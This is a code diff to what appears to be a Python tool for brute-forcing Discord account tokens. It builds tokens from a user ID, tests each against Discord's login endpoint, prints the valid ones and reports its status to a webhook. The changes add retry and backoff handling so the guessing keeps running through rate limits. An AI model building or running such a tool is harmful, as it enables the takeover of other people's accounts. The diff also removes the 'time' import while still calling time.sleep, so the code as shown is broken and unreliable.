@@ -3,11 +3,22 @@ import os
 import random
 import string
 import requests
-import time
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.util.retry import Retry
 from discord_webhook import DiscordWebhook
 
 # Replace <YOUR_WEBHOOK_URL> with the URL of your Discord webhook
 WEBHOOK_URL = "<YOUR_WEBHOOK_URL>"
+
+# Set up the HTTP session with retries and backoff
+retry_strategy = Retry(
+    total=3,
+    status_forcelist=[429, 500, 502, 503, 504],
+    backoff_factor=1
+)
+http_adapter = HTTPAdapter(max_retries=retry_strategy)
+session = requests.Session()
+session.mount("https://", http_adapter)
 
 # Encode the user ID to create the initial token
 id_to_token = base64.b64encode((input("ID TO TOKEN --> ")).encode("ascii"))
@@ -23,7 +34,7 @@ while id_to_token == id_to_token:
     headers={
         'Authorization': token
     }
-    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
+    login = session.get('https://discordapp.com/api/v9/auth/login', headers=headers)
     try:
         if login.status_code == 200:
             print('[+] VALID' + ' ' + token)
@@ -35,8 +46,8 @@ while id_to_token == id_to_token:
     finally:
         print("")
     
-    # Send a "running" message to the webhook every hour
-    webhook_time = 60 * 60  # Send a message every hour
+    # Send a "running" message to the webhook every 10 minutes
+    webhook_time = 60 * 10  # Send a message every 10 minutes
     time.sleep(webhook_time)
     webhook = DiscordWebhook(url=WEBHOOK_URL, content="@everyone Code is still running")
     response = webhook.execute()
